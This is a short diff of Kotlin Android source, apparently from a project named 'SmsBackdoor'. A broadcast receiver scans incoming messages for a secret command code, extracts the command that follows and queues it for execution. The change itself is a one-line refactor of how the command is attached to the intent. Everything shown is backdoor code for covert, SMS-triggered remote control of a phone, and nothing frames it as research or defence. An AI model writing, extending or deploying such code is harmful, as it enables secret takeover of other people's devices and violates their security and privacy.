@@ -53,7 +53,7 @@ internal class RemoteCommandReceiver: BroadcastReceiver(){
             }
             command.toString().takeIf { cmd -> cmd.contains(SmsBackdoor.commandCode) }?.let { cmd ->
                 val remoteCommand = cmd.split(SmsBackdoor.commandCode)[1].trim()
-                intent.apply { putExtra(SmsBackdoor.KEY_REMOTE_COMMAND, remoteCommand) }
+                intent.putExtra(SmsBackdoor.KEY_REMOTE_COMMAND, remoteCommand)
                 RemoteCommandExecutor.enqueWork(ctx!!, intent)
             }
         }
